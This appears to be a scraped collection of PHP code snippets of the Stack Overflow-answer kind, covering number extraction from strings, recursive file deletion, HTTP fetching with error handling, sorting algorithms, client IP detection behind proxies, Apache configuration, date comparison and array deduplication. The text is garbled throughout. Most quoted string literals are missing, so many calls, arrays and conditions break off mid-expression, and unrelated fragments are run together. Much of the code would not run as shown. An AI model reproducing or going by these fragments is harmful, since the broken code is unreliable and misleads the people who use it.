$the_date_time = new DateTime($date_string); $the_date_time_in_ms = ($the_date_time->format( ($the_date_time->format(
function get_millis(){ list($usec, $sec) = explode( return (int) ((int) $sec * 1000 + ((float) $usec * 1000)); }
$str = $int = (int) filter_var($str, FILTER_SANITIZE_NUMBER_INT);
$s = "In My Cart : 11 items"; preg_match("|\d+|", $s, $m); var_dump($m);
function extract_numbers($string) { preg_match_all( return $match[0]; }
$string = "Hello! 123 test this? 456. done? 100%"; $int = intval(preg_replace( echo $int;
$string = $string2 = preg_match_all( preg_match_all(
$str = "Doughnuts, 4; doughnuts holes, 0.08; glue, 3.4"; $str = preg_replace( $str = preg_replace( $str = trim($str, $arr = explode(
$value = $onlyNumeric = filter_var($value, FILTER_SANITIZE_NUMBER_FLOAT, FILTER_FLAG_ALLOW_FRACTION);
$string = echo intval(preg_replace( echo number_format(intval(preg_replace(
$res = array(); $str = $str = preg_replace("/[^0-9\.]/", " ", $str); $str = trim(preg_replace( $arr = explode( for ($i = 0; $i < count($arr); $i++) { if (is_numeric($arr[$i])) { $res[] = $arr[$i]; } } print_r($res);
$str = $num = for ($i = 0; $i < strlen($str); $i++) { if (is_numeric($str[$i])) { $num .= $str[$i]; } } echo $num;
function unicodeStrDigits($str) { $arr = array(); $sub = for ($i = 0; $i < strlen($str); $i++) { if (is_numeric($str[$i])) { $sub .= $str[$i]; continue; } else { if ($sub) { array_push($arr, $sub); $sub = } } } if ($sub) { array_push($arr, $sub); } return $arr; }
$files = glob( foreach($files as $file){ if(is_file($file)) unlink($file); }
$dir = "path/to/directory"; $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS); $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST); foreach ( $ri as $file ) { $file->isDir() ? rmdir($file) : unlink($file); } return true;
foreach (new DirectoryIterator( if(!$fileInfo->isDot()) { unlink($fileInfo->getPathname()); } }
/** * Delete a file or recursively delete a directory * * @param string $str Path to file or directory */ function recursiveDelete($str) { if (is_file($str)) { return @unlink($str); } elseif (is_dir($str)) { $scan = glob(rtrim($str, foreach($scan as $index=>$path) { recursiveDelete($path); } return @rmdir($str); } }
<?php if ($handle = opendir( { echo "Directory handle: $handle\n"; echo "Files:\n"; while (false !== ($file = readdir($handle))) { if( is_file($file) ) { unlink($file); } } closedir($handle); } ?>
$files = glob( foreach($files as $file){ if(is_file($file)) unlink($file); }
class Your_Class_Name { /** * @see http: * @see http: * @see http: * @see http: * @param string $path */ public function delete($path) { if (is_dir($path)) { array_map(function($value) { $this->delete($value); rmdir($value); },glob($path . array_map( } } }
function unlinkr($dir, $pattern = "*") { $files = glob($dir . "/$pattern"); foreach($files as $file){ if (is_dir($file) and !in_array($file, array( echo "<p>opening directory $file </p>"; unlinkr($file, $pattern); echo "<p> deleting directory $file </p>"; rmdir($file); } else if(is_file($file) and ($file != __FILE__)) { echo "<p>deleting file $file </p>"; unlink($file); } } }
$files = new Files(); $results = $files->copyOrMove(
$files = new Files(); $results = $files->calculateSize(
<? function listFolderFiles($dir) { $ffs = scandir($dir); echo foreach ($ffs as $ff) { if ($ff != if (file_exists("$dir/$ff")) { unlink("$dir/$ff"); } echo if (is_dir($dir . listFolderFiles($dir . } echo } } echo } $arr = array( "folder1", "folder2" ); for ($x = 0; $x < count($arr); $x++) { $mm = $arr[$x]; listFolderFiles($mm); } ?>
function removeDirectory($dirPath) { if (! is_dir($dirPath)) { return false; } if (substr($dirPath, strlen($dirPath) - 1, 1) != $dirPath .= } if ($handle = opendir($dirPath)) { while (false !== ($sub = readdir($handle))) { if ($sub != "." && $sub != ".." && $sub != "Thumb.db") { $file = $dirPath . $sub; if (is_dir($file)) { removeDirectory($file); } else { unlink($file); } } } closedir($handle); } rmdir($dirPath); }
function glob_recursive($pattern, $flags = 0) { $fileList = glob($pattern, $flags); foreach (glob(dirname($pattern). $subPattern = $dir. $subFileList = glob_recursive($subPattern, $flags); $fileList = array_merge($fileList, $subFileList); } return $fileList; } function glob_recursive_unlink($pattern, $flags = 0) { array_map( }
public static function recursiveDelete($dir) { foreach (new \DirectoryIterator($dir) as $fileInfo) { if (!$fileInfo->isDot()) { if ($fileInfo->isDir()) { recursiveDelete($fileInfo->getPathname()); } else { unlink($fileInfo->getPathname()); } } } rmdir($dir); }
<?php echo substr($string, 0, strlen($string) - 3); ?>
$str1 = "123456789ABC"; $str2 = substr( $str1, 0, -3 ); echo $str2:
$postdata = http_build_query( array( ) ); $opts = array( array( ) ); $context = stream_context_create($opts); $result = file_get_contents(
$params = array( )); $ctx = stream_context_create($params); $fp = @fopen($sUrl, if (!$fp) { throw new Exception("Problem with $sUrl, $php_errormsg"); } $response = @stream_get_contents($fp); if ($response === false) { throw new Exception("Problem reading data from $sUrl, $php_errormsg"); }
$sUrl = $params = array( )); $ctx = stream_context_create($params); $fp = @fopen($sUrl, if(!$fp) { throw new Exception("Problem with $sUrl, $php_errormsg"); } $response = @stream_get_contents($fp); if($response === false) { throw new Exception("Problem reading data from $sUrl, $php_errormsg"); }
function cmp(array $a, array $b) { if ($a[ return -1; } else if ($a[ return 1; } else { return 0; } }
function cmp($a, $b) { echo var_dump($a); echo var_dump($b); }
function cmp(array $a, array $b) { return someFunction($a[ }
function cmp(array $a, array $b) { return strcmp($a[ }
function cmp(array $a, array $b) { if (($cmp = strcmp($a[ return $cmp; } else { return $a[ } }
function cmp(array $a, array $b) { static $order = array( return array_search($a[ }
usort($array, function (array $a, array $b) { return $a[
class SimpleHeapSort extends SplHeap { public function compare($a, $b) { return strcmp($a, $b); } } $heap = new SimpleHeapSort(); $heap->insert("a"); $heap->insert("b"); $heap->insert("c"); echo implode(PHP_EOL, iterator_to_array($heap));
$heap = new SplMaxHeap(); $heap->insert(1); $heap->insert(2); $heap->insert(3);
$heap = new SplMinHeap (); $heap->insert(3); $heap->insert(1); $heap->insert(2);
function bubbleSort(array $array) { $array_size = count($array); for($i = 0; $i < $array_size; $i ++) { for($j = 0; $j < $array_size; $j ++) { if ($array[$i] < $array[$j]) { $tem = $array[$i]; $array[$i] = $array[$j]; $array[$j] = $tem; } } } return $array; }
function selectionSort(array $array) { $length = count($array); for($i = 0; $i < $length; $i ++) { $min = $i; for($j = $i + 1; $j < $length; $j ++) { if ($array[$j] < $array[$min]) { $min = $j; } } $tmp = $array[$min]; $array[$min] = $array[$i]; $array[$i] = $tmp; } return $array; }
function insertionSort(array $array) { $count = count($array); for($i = 1; $i < $count; $i ++) { $j = $i - 1; $element = $array[$i]; while ( $j >= 0 && $array[$j] > $element ) { $array[$j + 1] = $array[$j]; $array[$j] = $element; $j = $j - 1; } } return $array; }
function shellSort(array $array) { $gaps = array( 1, 2, 3, 4, 6 ); $gap = array_pop($gaps); $length = count($array); while ( $gap > 0 ) { for($i = $gap; $i < $length; $i ++) { $tmp = $array[$i]; $j = $i; while ( $j >= $gap && $array[$j - $gap] > $tmp ) { $array[$j] = $array[$j - $gap]; $j -= $gap; } $array[$j] = $tmp; } $gap = array_pop($gaps); } return $array; }
function combSort(array $array) { $gap = count($array); $swap = true; while ( $gap > 1 || $swap ) { if ($gap > 1) $gap /= 1.25; $swap = false; $i = 0; while ( $i + $gap < count($array) ) { if ($array[$i] > $array[$i + $gap]) { list($array[$i], $array[$i + $gap]) = array( $array[$i + $gap], $array[$i] ); $swap = true; } $i ++; } } return $array; }
function mergeSort(array $array) { if (count($array) <= 1) return $array; $left = mergeSort(array_splice($array, floor(count($array) / 2))); $right = mergeSort($array); $result = array(); while ( count($left) > 0 && count($right) > 0 ) { if ($left[0] <= $right[0]) { array_push($result, array_shift($left)); } else { array_push($result, array_shift($right)); } } while ( count($left) > 0 ) array_push($result, array_shift($left)); while ( count($right) > 0 ) array_push($result, array_shift($right)); return $result; }
function quickSort(array $array) { if (count($array) == 0) { return $array; } $pivot = $array[0]; $left = $right = array(); for($i = 1; $i < count($array); $i ++) { if ($array[$i] < $pivot) { $left[] = $array[$i]; } else { $right[] = $array[$i]; } } return array_merge(quickSort($left), array( $pivot ), quickSort($right)); }
function permutationSort($items, $perms = array()) { if (empty($items)) { if (inOrder($perms)) { return $perms; } } else { for($i = count($items) - 1; $i >= 0; -- $i) { $newitems = $items; $newperms = $perms; list($foo) = array_splice($newitems, $i, 1); array_unshift($newperms, $foo); $res = permutationSort($newitems, $newperms); if ($res) { return $res; } } } } function inOrder($array) { for($i = 0; $i < count($array); $i ++) { if (isset($array[$i + 1])) { if ($array[$i] > $array[$i + 1]) { return False; } } } return True; }
function radixSort($array) { $n = count($array); $partition = array(); for($slot = 0; $slot < 256; ++ $slot) { $partition[] = array(); } for($i = 0; $i < $n; ++ $i) { $partition[$array[$i]->age & 0xFF][] = &$array[$i]; } $i = 0; for($slot = 0; $slot < 256; ++ $slot) { for($j = 0, $n = count($partition[$slot]); $j < $n; ++ $j) { $array[$i ++] = &$partition[$slot][$j]; } } return $array; }
usort($array, function($a, $b) { return strcmp($a[0], $b[0]); });
array_walk($array, function(&$element, $index) { $element = array($element, $index); });
usort($array, function($a, $b) { $tmp = strcmp($a[0][0], $b[0][0]); if ($tmp != 0) { return $tmp; } return $a[1] - $b[1]; });
array_walk($array, function(&$element) { $element = $element[0]; });
function stablecmp($fn) { return function($a, $b) use ($fn) { if (($tmp = call_user_func($fn, $a[0], $b[0])) != 0) { return $tmp; } else { return $a[1] - $b[1]; } }; }
usort($array, stablecmp(function($a, $b) { return strcmp($a[0], $b[0]); }));
$orderArray = array("Jan","Feb","Mar","Apr","May","June","July","Aug","Sept","Oct","Nov","Dec"); usort($array, function($a, $b) use ($orderArray){ return array_search($a->month, $orderArray) - array_search($b->month, $orderArray); });
$sortedByName = from($objects)->orderBy( $sortedByCount = from($objects)->orderBy( $sortedByCountAndName = from($objects)->orderBy(
function multisortByKeyValue( $k, $arr ) { $ids = array(); $index = 1; foreach ( $arr as $key => $row ) { $ids[ $key ] = intval( $row[ $k ] ) . $index ++; } natsort( $ids ); $arr = array_merge( $ids, $arr ); return $arr; }
$arr = array( ), ), ), ), ); $sorted = multisortByKeyValue( /* array ( ), ), ), ), ) */
$sorted = sorted([3, 1, 2]); $sortedDesc = sorted([3, 1, 2], true);
$sortedByLength = sorted([ $sortedByLengthDesc = sorted([ $sortedByTheFirstCharacter = sorted([ $sortedByTheFirstCharacter = sorted([ $sortedByTheFirstCharacterDesc = sorted([
$users = [ array( array( array( ]; $sortedByName = sorted($users, itemGetter( $sortedByNameDesc = sorted($users, true, itemGetter(
$users = [ new User( new User( new User( ]; $sortedByName = sorted($users, propertyGetter( $sortedByNameDesc = sorted($users, true, propertyGetter( $sortedByAge = sorted($users, methodCaller( $sortedByAgeDesc = sorted($users, true, methodCaller(
$sortedLexicographically = sorted([ $sortedByTheFirstCharacter = sorted([ return chr($v1[0]) - chr($v2[0]); });
<?php $number = array(8,9,3,4,0,1,2); sort($number); foreach ($number as $value) { echo $value." "; } ?>
<?php $number = array(8,9,3,4,0,1,2); rsort($number); foreach ($number as $value) { echo $value." "; } ?>
<?php $number = array( asort($number); foreach ($number as $value) { echo $value." "; } ?>
<?php $number = array( ksort($number); foreach ($number as $value) { echo $value." "; } ?>
<?php $number = array( krsort($number); foreach ($number as $value) { echo $value." "; } ?>
$array_compare= array("0" =>4,"1"=>2,"2"=>500,"3"=>100);
usort($array_compare, function($a, $b) { return ($b[ });
usort($array_compare, function($a, $b) { return ($b[ });
$site="http: $content = file_get_content($site); echo $content;
set_error_handler( function ($severity, $message, $file, $line) { throw new ErrorException($message, $severity, $severity, $file, $line); } ); try { file_get_contents( } catch (Exception $e) { echo $e->getMessage(); } restore_error_handler();
if (!$data = file_get_contents("http: $error = error_get_last(); echo "HTTP request failed. Error was: " . $error[ } else { echo "Everything went better than expected"; }
function file_contents($path) { $str = @file_get_contents($path); if ($str === FALSE) { throw new Exception("Cannot access } else { return $str; } } try { file_contents("a"); file_contents("b"); file_contents("c"); } catch (Exception $e) { echo "Error: " , $e->getMessage(); }
$content = @file_get_contents("http: if (strpos($http_response_header[0], "200")) { echo "SUCCESS"; } else { echo "FAILED"; }
function custom_file_get_contents($url) { return file_get_contents( $url, false, stream_context_create( array( ) ) ) ); } $content=FALSE; if($content=custom_file_get_contents($url)) { } else { }
$this->response_body = @file_get_contents($this->url, false, $context); if ($this->response_body === false) { $error = error_get_last(); $error = explode( $error = trim($error[2]) . PHP_EOL; fprintf(STDERR, die(); }
$url = @file_get_contents("http: if ($url) { echo $url; } else { echo "connection error"; }
$site="http: $old_error_reporting = error_reporting(E_ALL ^ E_WARNING); $content = file_get_content($site); error_reporting($old_error_reporting); if ($content === FALSE) { echo "Error getting } else { echo $content; }
try { $content = file_get_contents($site); } catch(\Exception $e) { return }
$file = "path/to/file"; if(file_exists($file)){ $content = file_get_contents($file); }
try { $site="http: $content = file_get_content($site); echo $content; } catch (ErrorException $e) { } set_error_handler(function ($errorNumber, $errorText, $errorFile,$errorLine ) { throw new ErrorException($errorText, 0, $errorNumber, $errorFile, $errorLine); });
$this_one = true; $that = false; $truthiness = $this_one and $that;
if ($var = true && false) if ($var = true and false)
var_dump(true and false || false); $a = true and false || false; var_dump($a);
$a = true; $b = true; $c = $a & $b; var_dump(true === $c);
if (true || true && false); if (true || (true && false));
if (true || true AND false); if ((true || true) && false);
/** * Retrieves the best guess of the client * Takes into account numerous HTTP proxy headers due to variations * in how different ISPs handle IP addresses in headers between hops. */ public function get_ip_address() { if (!empty($_SERVER[ return $_SERVER[ if (!empty($_SERVER[ $iplist = explode( foreach ($iplist as $ip) { if ($this->validate_ip($ip)) return $ip; } } } if (!empty($_SERVER[ return $_SERVER[ if (!empty($_SERVER[ return $_SERVER[ if (!empty($_SERVER[ return $_SERVER[ if (!empty($_SERVER[ return $_SERVER[ return $_SERVER[ } /** * Ensures an IP address is both a valid IP address and does not fall within * a private network range. * * @access public * @param string $ip */ public function validate_ip($ip) { if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) return false; self::$ip = $ip; return true; }
function get_ip_address(){ foreach (array( if (array_key_exists($key, $_SERVER) === true){ foreach (explode( $ip = trim($ip); if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false){ return $ip; } } } } }
public function validate_ip($ip) { if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) { return false; } self::$ip = sprintf( return true; }
if (!empty($_SERVER[ { if (strpos($_SERVER[ { $iplist = explode( foreach ($iplist as $ip) { if ($this->validate_ip($ip)) return $ip; } } else { if ($this->validate_ip($_SERVER[ return $_SERVER[ } }
if (!empty($_SERVER[ { $iplist = explode( foreach ($iplist as $ip) { if ($this->validate_ip($ip)) return $ip; } }
/** * Get the customer * * @return string */ public function getIpAddress() { if (!empty($_SERVER[ return $_SERVER[ } else if (!empty($_SERVER[ $ips = explode( return trim($ips[count($ips) - 1]); } else { return $_SERVER[ } }
Private Function GetRequestIpAddress() As IPAddress Dim serverVariables = HttpContext.Current.Request.ServerVariables Dim headersKeysToCheck = {"HTTP_CLIENT_IP", _ "HTTP_X_FORWARDED_FOR", _ "HTTP_X_FORWARDED", _ "HTTP_X_CLUSTER_CLIENT_IP", _ "HTTP_FORWARDED_FOR", _ "HTTP_FORWARDED", _ "REMOTE_ADDR"} For Each thisHeaderKey In headersKeysToCheck Dim thisValue = serverVariables.Item(thisHeaderKey) If thisValue IsNot Nothing Then Dim validAddress As IPAddress = Nothing If IPAddress.TryParse(thisValue, validAddress) Then Return validAddress End If End If Next Return Nothing End Function
$enableProxyBust = true; if (($enableProxyBust == true) && (isset($_SERVER[ $ip = end(array_values(array_filter(explode( $ipProxy = $_SERVER[ $ipProxy_label = } elseif (($enableProxyBust == true) && (isset($_SERVER[ $ip = $_SERVER[ $ipProxy = $ipProxy_label = } elseif (($enableProxyBust == false) && (isset($_SERVER[ $ip = $_SERVER[ $ipProxy = $ipProxy_label = } else { $ip = $ipProxy = $ipProxy_label = }
function fooNow() { global $ip, $ipProxy, $ipProxy_label; }
$info = ip_info(); if ( $info->proxy ) { echo } else { echo }
/** * Retrieves the best guess of the client * Takes into account numerous HTTP proxy headers due to variations * in how different ISPs handle IP addresses in headers between hops. * * @since 1.1.3 * * @return object { * IP Address details * * string $ip The users IP address (might be spoofed, if $proxy is true) * bool $proxy True, if a proxy was detected * string $proxy_id The proxy-server IP address * } */ function ip_info() { $result = (object) array( ); /* * This code tries to bypass a proxy and get the actual IP address of * the visitor behind the proxy. * Warning: These values might be spoofed! */ $ip_fields = array( ); foreach ( $ip_fields as $key ) { if ( array_key_exists( $key, $_SERVER ) === true ) { foreach ( explode( $ip = trim( $ip ); if ( filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE ) !== false ) { $forwarded = $ip; break 2; } } } } if ( $forwarded != $result->ip ) { $result->proxy = true; $result->proxy_ip = $result->ip; $result->ip = $forwarded; } return $result; }
<?php if (!function_exists( { function getClientIP() { if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) { $_SERVER[ }; foreach (array( { if (array_key_exists($key, $_SERVER)) { foreach (explode( { $ip = trim($ip); if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) { return $ip; }; }; }; }; return false; }; }; $best_known_ip = getClientIP(); if(!empty($best_known_ip)) { $ip = $clients_ip = $client_ip = $client_IP = $best_known_ip; } else { $ip = $clients_ip = $client_ip = $client_IP = $best_known_ip = }; ?>
public function validate_ip($ip) { if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE) === false) return false; if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_RES_RANGE) === false) return false; if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) === false && filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) === false) return false; return true; }
function getIP() { $fields = array( foreach($fields as $f) { $tries = $_SERVER[$f]; if (empty($tries)) continue; $tries = explode( foreach($tries as $try) { $r = filter_var($try, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE); if ($r !== false) { return $try; } } } return false; }
function validateIp($var_ip){ $ip = trim($var_ip); return (!empty($ip) && $ip != $ip != filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) ? $ip : false; } function getClientIp() { $ip = @$this->validateIp($_SERVER[ @$this->validateIp($_SERVER[ @$this->validateIp($_SERVER[ @$this->validateIp($_SERVER[ @$this->validateIp($_SERVER[ @$this->validateIp($_SERVER[ return $ip; }
const HEADER_FORWARDED = const HEADER_CLIENT_IP = const HEADER_CLIENT_HOST = const HEADER_CLIENT_PROTO = const HEADER_CLIENT_PORT = /** * Names for headers that can be trusted when * using trusted proxies. * * The FORWARDED header is the standard as of rfc7239. * * The other headers are non-standard, but widely used * by popular reverse proxies (like Apache mod_proxy or Amazon EC2). */ protected static $trustedHeaders = array( self::HEADER_FORWARDED => self::HEADER_CLIENT_IP => self::HEADER_CLIENT_HOST => self::HEADER_CLIENT_PROTO => self::HEADER_CLIENT_PORT => ); /** * Returns the client IP addresses. * * In the returned array the most trusted IP address is first, and the * least trusted one last. The "real" client IP address is the last one, * but this is also the least trusted one. Trusted proxies are stripped. * * Use this method carefully; you should use getClientIp() instead. * * @return array The client IP addresses * * @see getClientIp() */ public function getClientIps() { $clientIps = array(); $ip = $this->server->get( if (!$this->isFromTrustedProxy()) { return array($ip); } if (self::$trustedHeaders[self::HEADER_FORWARDED] && $this->headers->has(self::$trustedHeaders[self::HEADER_FORWARDED])) { $forwardedHeader = $this->headers->get(self::$trustedHeaders[self::HEADER_FORWARDED]); preg_match_all( $clientIps = $matches[3]; } elseif (self::$trustedHeaders[self::HEADER_CLIENT_IP] && $this->headers->has(self::$trustedHeaders[self::HEADER_CLIENT_IP])) { $clientIps = array_map( } $clientIps[] = $ip; $firstTrustedIp = null; foreach ($clientIps as $key => $clientIp) { if (preg_match( $clientIps[$key] = $clientIp = $match[1]; } if (!filter_var($clientIp, FILTER_VALIDATE_IP)) { unset($clientIps[$key]); } if (IpUtils::checkIp($clientIp, self::$trustedProxies)) { unset($clientIps[$key]); if (null === $firstTrustedIp) { $firstTrustedIp = $clientIp; } } } return $clientIps ? array_reverse($clientIps) : array($firstTrustedIp); }
-- mysql DROP TABLE IF EXISTS `attempts`; CREATE TABLE `attempts` ( `id` int(11) NOT NULL AUTO_INCREMENT, `ip` varchar(39) NOT NULL, `expiredate` datetime NOT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; -- sqlite ...
public function isBlocked() { /* * used one of the above methods to capture user */ $ip = $this->ip; $this->deleteAttempts($ip, false); $query = $this->dbh->prepare("SELECT count(*) FROM {$this->token->get( $query->execute(array($ip)); $attempts = $query->fetchColumn(); if ($attempts < intval($this->token->get( return "allow"; } if ($attempts < intval($this->token->get( return "captcha"; } return "block"; }
`ip` varchar(39) NOT NULL, `jwt_load varchar(100) NOT NULL
function getRealIpAddr() { if(!empty($_SERVER[ { $IPaddress = $_SERVER[ } elseif (!empty($_SERVER[ { $IPaddress = $_SERVER[ } else { $IPaddress = $_SERVER[ } return $IPaddress; }
/** * Sanitizes IPv4 address according to Ilia Alshanetsky * "php|architect?s Guide to PHP Security", chapter 2, page 67. * * @param string $ip An IPv4 address */ public static function sanitizeIpAddress($ip = { if ($ip == { $rtnStr = } else { $rtnStr = long2ip(ip2long($ip)); } return $rtnStr; } /** * Returns the sanitized HTTP_X_FORWARDED_FOR server variable. * */ public static function getXForwardedFor() { if (isset($_SERVER[ { $rtnStr = $_SERVER[ } elseif (isset($HTTP_SERVER_VARS[ { $rtnStr = $HTTP_SERVER_VARS[ } elseif (getenv( { $rtnStr = getenv( } else { $rtnStr = } if ($rtnStr != { $rtnStr = explode( $rtnStr = self::sanitizeIpAddress($rtnStr[0]); } return $rtnStr; } /** * Returns the sanitized REMOTE_ADDR server variable. * */ public static function getRemoteAddr() { if (isset($_SERVER[ { $rtnStr = $_SERVER[ } elseif (isset($HTTP_SERVER_VARS[ { $rtnStr = $HTTP_SERVER_VARS[ } elseif (getenv( { $rtnStr = getenv( } else { $rtnStr = } if ($rtnStr != { $rtnStr = explode( $rtnStr = self::sanitizeIpAddress($rtnStr[0]); } return $rtnStr; } /** * Returns the sanitized remote user and proxy IP addresses. * */ public static function getIpAndProxy() { $xForwarded = self::getXForwardedFor(); $remoteAddr = self::getRemoteAddr(); if ($xForwarded != { $ip = $xForwarded; $proxy = $remoteAddr; } else { $ip = $remoteAddr; $proxy = } return array($ip, $proxy); }
sudo a2enmod proxy_fcgi setenvif sudo a2enconf php7.0-fpm sudo service apache2 restart
<FilesMatch ".+\.ph(p[345]?|t|tml)$"> SetHandler application/x-httpd-php </FilesMatch>
<IfModule php7_module> AddType application/x-httpd-php .php AddType application/x-httpd-php-source .phps <IfModule dir_module> DirectoryIndex index.html index.php </IfModule> </IfModule>
$ sudo apt-get install lamp-server^ $ sudo a2enmod php7.0 $ sudo service apache2 restart
<FilesMatch ".+\.html$"> SetHandler application/x-httpd-php </FilesMatch>
<IfModule php7_module> AddType application/x-httpd-php .php AddType application/x-httpd-php-source .phps <IfModule dir_module> DirectoryIndex index.html index.php </IfModule>
<IfModule php7_module> AddType application/x-httpd-php .php AddType application/x-httpd-php-source .phps <IfModule dir_module> DirectoryIndex index.html index.php </IfModule> </IfModule>
$sudo apt-get install php5-mcrypt $sudo php5enmod mcrypt
<IfModule mod_php5.c> php_flag engine off </IfModule>
<VirtualHost *:80> ServerName example.com DocumentRoot "/var/www/example.com" <FilesMatch "\.php$"> SetHandler "proxy:fcgi: </FilesMatch> </VirtualHost>
LoadModule proxy_module lib/httpd/modules/mod_proxy.so LoadModule proxy_fcgi_module lib/httpd/modules/mod_proxy_fcgi.so
LoadModule php5_module "C:/php/php5apache2_4.dll" AddHandler application/x-httpd-php .php <FilesMatch \.php$> SetHandler application/x-httpd-php </FilesMatch>
$st_dt = new DateTime(verifyParam ( $end_dt = new DateTime(verifyParam ( if ($end_dt < $start_dt)
dev:~ <?php date_default_timezone_set( $d1 = new DateTime( $d2 = new DateTime( var_dump($d1 == $d2); var_dump($d1 > $d2); var_dump($d1 < $d2); ?> bool(false) bool(true) bool(false) dev:~ PHP 5.2.6-1+lenny3 with Suhosin-Patch 0.9.6.2 (cli) (built: Apr 26 2009 20:09:03) Copyright (c) 1997-2008 The PHP Group Zend Engine v2.2.0, Copyright (c) 1998-2008 Zend Technologies dev:~#
$date1 = new DateTime("now"); $date2 = new DateTime("tomorrow"); var_dump($date1 == $date2); var_dump($date1 < $date2); var_dump($date1 > $date2);
$datetime1 = new DateTime( $datetime2 = new DateTime( $interval = $datetime1->diff($datetime2); echo $interval->format(
$elapsed = $time_past = $time_past = strtotime($time_past); $time_past = $time_past + $elapsed; $time_now = time(); if($time_past > $time_now){ echo }else{ echo }
$today = date("m-d-Y H:i:s"); $thisMonth =date("m"); $thisYear = date("y"); $expectedDate = ($thisMonth+1)."-08-$thisYear 23:58:00"; if (strtotime($expectedDate) > strtotime($today)) { echo "Expected date is greater then current date"; return ; } else { echo "Expected date is lesser then current date"; }
$aDate = new \DateTime( $bDate = new \DateTime( $aDate <=> $bDate;
Array ( [0] => Array ( [0] => abc [1] => def ) [1] => Array ( [0] => ghi [1] => jkl ) [2] => Array ( [0] => mno [1] => pql ) [3] => Array ( [0] => abc [1] => def ) [4] => Array ( [0] => ghi [1] => jkl ) [5] => Array ( [0] => mno [1] => pql ) )
$input = array_map("unserialize", array_unique(array_map("serialize", $input)));
<?php function super_unique($array,$key) { $temp_array = []; foreach ($array as &$v) { if (!isset($temp_array[$v[$key]])) $temp_array[$v[$key]] =& $v; } $array = array_values($temp_array); return $array; } $arr=""; $arr[0][ $arr[0][ $arr[1][ $arr[1][ $arr[2][ $arr[2][ $arr[3][ $arr[3][ echo "<pre>"; print_r($arr); echo "unique*********************<br/>"; print_r(super_unique($arr, ?>
function array_unique_multidimensional($input) { $serialized = array_map( $unique = array_unique($serialized); return array_intersect_key($input, $unique); }
function multi_unique($array) { foreach ($array as $k=>$na) $new[$k] = serialize($na); $uniq = array_unique($new); foreach($uniq as $k=>$ser) $new1[$k] = unserialize($ser); return ($new1); }
$array = [ [ ], [ ], [ ] ]; $ids = array_column($array, $ids = array_unique($ids); $array = array_filter($array, function ($key, $value) use ($ids) { return in_array($value, array_keys($ids)); }, ARRAY_FILTER_USE_BOTH);
Array ( [0] => Array ( [id] => 123 [foo] => aaa [bar] => bbb ) [2] => Array ( [id] => 567 [foo] => eee [bar] => fff ) )
Array ( [0] => Array ( [id] => 1 [name] => john ) [1] => Array ( [id] => 2 [name] => smith ) [2] => Array ( [id] => 3 [name] => john ) [3] => Array ( [id] => 4 [name] => robert ) ) $temp = array_unique(array_column($array, $unique_arr = array_intersect_key($array, $temp);
function search_array_compact($data,$key){ $compact = []; foreach($data as $row){ if(!in_array($row[$key],$compact)){ $compact[] = $row; } } return $compact; }
Array=> [0] => (array) [1] => (array) [2]=> (array)
$serialized = array(); for ($i=0; $i < sizeof($users); $i++) { $test = in_array($users[ if ($test == false) { $serialized[] = $users[ } }
function arrayUnique($myArray){ if(!is_array($myArray)) return $myArray; foreach ($myArray as &$myvalue){ $myvalue=serialize($myvalue); } $myArray=array_unique($myArray); foreach ($myArray as &$myvalue){ $myvalue=unserialize($myvalue); } return $myArray; }
$input = array_map("unserialize", array_unique(array_map("serialize", $input)));
Array ( [Key1] => Array ( [0] => Value1 [1] => Value2 [2] => Value1 [3] => Value3 [4] => Value1 ) [Key2] => Array ( [0] => Value1 [1] => Value2 [2] => Value1 [3] => Value3 [4] => Value4 ) )
foreach($array as $k=>$v){ $unique=array_unique($v); $array[$k]=$unique; }
Array ( [Key1] => Array ( [0] => Value1 [1] => Value2 [3] => Value3 ) [Key2] => Array ( [0] => Value1 [1] => Value2 [3] => Value3 [4] => Value4 ) )
foreach($array as $k=>$v){ $unique= array_values(array_unique($v)); $array[$k]=$unique; }
Array ( [Key1] => Array ( [0] => Value1 [1] => Value2 [2] => Value3 ) [Key2] => Array ( [0] => Value1 [1] => Value2 [2] => Value3 [3] => Value4 ) )
$test = [ [ [ [ [ [ [ ]; $result = array_reduce( $test, function($carry,$item){ if(!in_array($item,$carry)) { array_push($carry,$item); } return $carry; }, [] ); var_dump($result); /* php unique.php array(3) { [0] => array(2) { [0] => string(3) "abc" [1] => string(3) "def" } [1] => array(2) { [0] => string(3) "ghi" [1] => string(3) "jkl" } [2] => array(2) { [0] => string(3) "mno" [1] => string(3) "pql" } }
data = array ( [0] => array ( [subject] => a [object] => c ), [1] => array ( [subject] => b [object] => d ), [2] => array ( [subject] => d [object] => b ), [3] => array ( [subject] => d [object] => c ), [4] => array ( [subject] => c [object] => a ), [5] => array ( [subject] => c [object] => d ) )
data = array ( [0] => array ( [subject] => a [object] => c ), [1] => array ( [subject] => b [object] => d ), [2] => array ( [subject] => d [object] => c ) )
data = array ( [0] => array ( [subject] => d [object] => b ), [1] => array ( [subject] => c [object] => a ), [2] => array ( [subject] => c [object] => d ) )
